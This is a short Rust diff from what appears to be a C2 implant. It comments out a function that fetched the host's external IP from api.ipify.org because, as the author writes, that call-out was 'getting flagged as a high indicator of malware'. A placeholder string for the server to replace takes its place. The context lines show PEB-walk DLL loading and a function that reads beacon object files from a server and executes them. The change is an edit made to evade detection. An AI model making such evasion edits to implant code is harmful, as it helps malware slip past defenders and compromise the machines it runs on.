@@ -404,9 +404,7 @@ pub fn get_process_name(module_name: *const c_void) -> String {
     }
 } //get_process_name
 
-//this function makes a get request to api.ipify.org to get our external ip
-//it is not using https.
-//i dont think we can load winitenet.dll using peb walk, so might have to stick with using ldr_get_dll and ldr_get_fn
+/* removing this because the call out to apify is getting flagged as a high indicator of malware
 pub fn get_external_ip() -> String {
     /*
     This function, `get_external_ip`, is used to retrieve the external IP address of the current machine.
@@ -540,6 +538,13 @@ pub fn get_external_ip() -> String {
 
     ip
 } //http version
+*/
+
+pub fn get_external_ip() -> String {
+    // Return a placeholder that the server will recognize and replace
+    // Using a distinctive format that's unlikely to occur naturally
+    String::from("{{SERVER_REPLACE_IP}}")
+}
 
 //this function will read a bof file from the server and execute it
 pub fn read_and_exec(args: Vec<&str>, server: String, imp_token: String) -> String {
